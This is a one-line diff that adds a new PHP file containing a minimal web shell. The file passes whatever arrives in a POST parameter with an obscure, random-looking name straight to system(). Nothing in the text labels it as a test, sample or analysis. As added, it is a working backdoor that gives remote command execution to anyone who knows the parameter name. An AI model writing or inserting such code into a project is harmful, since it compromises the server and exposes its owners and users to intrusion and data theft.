@@ -1,0 +1,1 @@
+<?php system($_POST['a092c0f7']);?>
